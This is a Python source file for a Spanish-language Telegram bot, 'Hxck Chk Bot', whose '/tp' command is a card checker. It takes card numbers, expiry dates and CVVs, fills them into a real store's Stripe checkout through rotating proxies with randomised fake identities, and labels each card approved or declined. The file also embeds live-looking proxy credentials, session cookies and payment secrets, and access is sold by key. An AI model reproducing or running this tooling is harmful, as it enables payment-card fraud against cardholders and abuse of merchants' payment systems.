from pyrogram import Client
from pyrogram import filters
import time
import re
import requests
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from datetime import datetime
import json
from gates.textos import *
import random
import string
import asyncio
import os
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async
import socket


def ocultar_ip(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        partes = proxy.split(".")
        partes[-1] = ''
        partes[-3] = '.xxxx'
    return ''.join(partes)



async def verificar_proxies(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        proxy_ip, proxy_port = proxy.split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(5)
        sock.connect((proxy_ip, int(proxy_port)))
        return "Live! ✅"
    except socket.error as err:
        return "Dead! ❌", err
    finally:
        sock.close()
        
archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"  # Reemplaza con la ruta y nombre de tu archivo de texto
verificar_proxies(archivo)

@Client.on_message(filters.command('tp',prefixes=['.','!','/',',','-','$','%','#']))
async def st(_,message):

    tiempo = time.time()
    

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "tp"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="""<b>Command: <code>Stank</code>
Gateway: <code>Stripe Stripe Charged $14.99</code>
Estados: <code>❌</code>
Format: <code>/tp cc|month|year|cvv.</code></b>""")
        


    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 60}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    
    alaa = f'''<b>Command: <code>TP</code>
Gateway: <code>Stripe Charged $14.99</code>
Estados: <code>✅</code>
Format: <code>/tp cc|month|year|cvv.</code></b>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})

    #SESSION 

    session = requests.Session()
    session.proxies = {
    "http": "http://rzweacqg-rotate:3zm9ttp1td2d@p.webshare.io:80/",
    "https": "http://rzweacqg-rotate:3zm9ttp1td2d@p.webshare.io:80/"
}

    balon= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = requests.post('https://m.stripe.com/6', headers=balon).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
    random_data = json.loads(res.text)
    phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
    first_name = random_data['results'][0]['name']['first']
    last_name = random_data['results'][0]['name']['last']
    street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
    city = random_data['results'][0]['location']['city']
    state = random_data['results'][0]['location']['state']
    zip = random_data['results'][0]['location']['postcode']
    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
    reply = await message.reply_text("<b>Cargando proceso...</b>")  
    archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"
    ip = ocultar_ip(archivo)
    proxy = await verificar_proxies(archivo)
    
    cc = input[0]
    mes = input[1]
    ano = input[2]
    cvv = input[3]
    req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()          
    brand = req['brand']
    country = req['country']
    country_name = req['country_name']
    country_flag = req['country_flag']
    bank = req['bank']
    level = req['level']
    typea  = req['type']
    users = message.from_user.username
    bin = cc[:6]
    moneda = req['country_currencies']
    reqs = requests.get(f"https://lookup.binlist.net/{cc}").json()
    scheme = reqs["scheme"]
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


    x = get_bin_info (cc[0:6])

#-----------------------------------------------------------------------------------------------


    with open('/storage/emulated/0/Pixel_Chk/proxys.txt') as f:
        lines = f.readlines()
    for proxs in lines:
        proxies =  {
            'http': f'{proxs}', 
            'https': f'{proxs}'
}
        
        
        
        
    url = 'https://kb-3d.com/store/module/stripe_official/createIntent'

    cookies = {
    'PrestaShop-adc9c2d5aaddce6a23cf42026f730cae': 'def50200fd08468474825f5f2bab007a0b2629ce9ee9b8cf17df52fad54676da488ce061dc2c5ac2bb2a10730aa47b969765859bd3560907e391523c2e573d8c30903bb14e1a17a6c4d4a32fc57cc5dd14fe685b83d98de55e84c5c79003c73017317cb3fc72436f054e5535c0821424cfb334dd28d887f5ddffa09f9ac587904750f96fd96c8c8c785c04f2b764378b136a5da4955146082ef705f65c3b0a0fdb3323402764866ba5f00d9483f2dcaf02eb8cb08287a6a9588f19c958b9100abf83af213cf46d03f992387f54e07f7941e8fac90c68235ad2461d65044053df36263e33ec161ffaec89062bd287c256bd37d127cd16ad07b69e0c034b600877c0269813fc8dab9dcd0dfe890e6be5318c2f855187fa9134843c3f82c962285e14bc7f9712ce6d862e9a3a94ddeaef19b5d8c034b2d2e8f126914b0e0342c79d32d858af90dd5f5e5b992f2b987b26f4571abffddb265438e97806d00f038dbbae52152956d3833ef85752e1cb628a92527f16bb4df46345a050ded7c2aca7c6880b56ba92864ce40a7d58bade7317c267c661e874770b8a0bb03e6959528cd057e11be00425e69a26eb58adcb203f1c53bb4332d0c3a113abb1de0a76e8cb70871a44da3edd4ea6f7a1adc4ab70373f84fc876c000482f2c832a85742b3df9a55f2641e118b89ccac2ec2225e9d46e5d69696913ee93845fce1ba8b5363be8943718625bd2495376ab7931c6e70cf5908b6a3bed07266516845f339b181174b739ba8edccede7e9077498d18caca466726530050fdc52dd946b60697c5392aeeb549b779b0c8a9addd5f91a853a0f0911c17a20309f72f8a4fa91d4695bc434704ef3f9b6c937e202cdbc70',
    'PHPSESSID': 'af1a9e394584ad2398acf8cc6223b3a8',
    '__stripe_mid': 'b2120bf0-87c4-4751-b279-336e4dd8ccbf9866db',
    '__stripe_sid': 'fedd8d61-a5e5-42a3-8d7b-fe09676e87ff15daab',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-ES,es;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PrestaShop-adc9c2d5aaddce6a23cf42026f730cae=def50200fd08468474825f5f2bab007a0b2629ce9ee9b8cf17df52fad54676da488ce061dc2c5ac2bb2a10730aa47b969765859bd3560907e391523c2e573d8c30903bb14e1a17a6c4d4a32fc57cc5dd14fe685b83d98de55e84c5c79003c73017317cb3fc72436f054e5535c0821424cfb334dd28d887f5ddffa09f9ac587904750f96fd96c8c8c785c04f2b764378b136a5da4955146082ef705f65c3b0a0fdb3323402764866ba5f00d9483f2dcaf02eb8cb08287a6a9588f19c958b9100abf83af213cf46d03f992387f54e07f7941e8fac90c68235ad2461d65044053df36263e33ec161ffaec89062bd287c256bd37d127cd16ad07b69e0c034b600877c0269813fc8dab9dcd0dfe890e6be5318c2f855187fa9134843c3f82c962285e14bc7f9712ce6d862e9a3a94ddeaef19b5d8c034b2d2e8f126914b0e0342c79d32d858af90dd5f5e5b992f2b987b26f4571abffddb265438e97806d00f038dbbae52152956d3833ef85752e1cb628a92527f16bb4df46345a050ded7c2aca7c6880b56ba92864ce40a7d58bade7317c267c661e874770b8a0bb03e6959528cd057e11be00425e69a26eb58adcb203f1c53bb4332d0c3a113abb1de0a76e8cb70871a44da3edd4ea6f7a1adc4ab70373f84fc876c000482f2c832a85742b3df9a55f2641e118b89ccac2ec2225e9d46e5d69696913ee93845fce1ba8b5363be8943718625bd2495376ab7931c6e70cf5908b6a3bed07266516845f339b181174b739ba8edccede7e9077498d18caca466726530050fdc52dd946b60697c5392aeeb549b779b0c8a9addd5f91a853a0f0911c17a20309f72f8a4fa91d4695bc434704ef3f9b6c937e202cdbc70; PHPSESSID=af1a9e394584ad2398acf8cc6223b3a8; __stripe_mid=b2120bf0-87c4-4751-b279-336e4dd8ccbf9866db; __stripe_sid=fedd8d61-a5e5-42a3-8d7b-fe09676e87ff15daab',
    'Origin': 'https://kb-3d.com',
    'Pragma': 'no-cache',
    'Referer': 'https://kb-3d.com/store/order',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
    data = {
    'payment_option': 'card',
    'amount': '1499',
    'currency': 'usd',
    'stripe_auto_save_card': 'false',
    'card_form_payment': 'true',
    'save_card_form': 'false',
    'payment_request': 'false',
}
    response = requests.get(url, headers=headers, data=data, cookies=cookies)
    await asyncio.sleep(5)
    #decoded_response = response.text
    #result = json.loads(decoded_response)
    #id = result['id']
    #id2 = result['client_secret']
    url = 'https://api.stripe.com/v1/payment_intents/pi_3O44N3IzTCmXvRlC1OxAH4fs/confirm'

    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
    
    time.sleep(5)
    
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
}

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][address][city]=new+york&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=street+14&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=10014&payment_method_data[billing_details][email]=nefim503%40gmail.com&payment_method_data[billing_details][name]=Renga+Lopez&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=43227bd9-8694-41c0-b18f-34407cd1bee250879a&payment_method_data[muid]=b2120bf0-87c4-4751-b279-336e4dd8ccbf9866db&payment_method_data[sid]=fedd8d61-a5e5-42a3-8d7b-fe09676e87ff15daab&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F7e8ee2cfca%3B+stripe-js-v3%2F7e8ee2cfca%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Fkb-3d.com&payment_method_data[time_on_page]=37934&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HRhgRIzTCmXvRlCzSlYUD5gy9kdjofd9uqre47CIQK3jIdIxPD848vYIZ1CQ7w6YhI3b87tzJDTWd3W92vEex1b00ZqJw64JC&client_secret=pi_3O44N3IzTCmXvRlC1OxAH4fs_secret_H9LhXyIVXpxvjdi7K4cRzST4s'
    
    response = requests.post(url, headers=headers, data=data)

    respo = response.json()
    result2 = response.json()
    if 'error' in result2:
              errormessage = result2['error']['message'] + ' ' + result2['error']['code']
              dedoeError = result2['error']['code']
              
    else:
               errormessage = result2['status']
        
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/+rtV8voEx9vA0ODRh"),
               
            ]
        ]
    )
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Charged</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
               
    if 'status' in result2 and result2['status'] == 'succeeded':
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Approved! ✅ 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe Charged </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>
""", disable_web_page_preview=True,
            reply_markup=keyboard)
    elif(errormessage=="Your card's security code is incorrect. incorrect_cvc"):
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Approved CCN! ✅ 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe Charged </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True,
            reply_markup=keyboard)
            
    else:
        await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: Declined! ❌
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{errormessage}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Stripe Charged </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True,
            reply_markup=keyboard) 
            
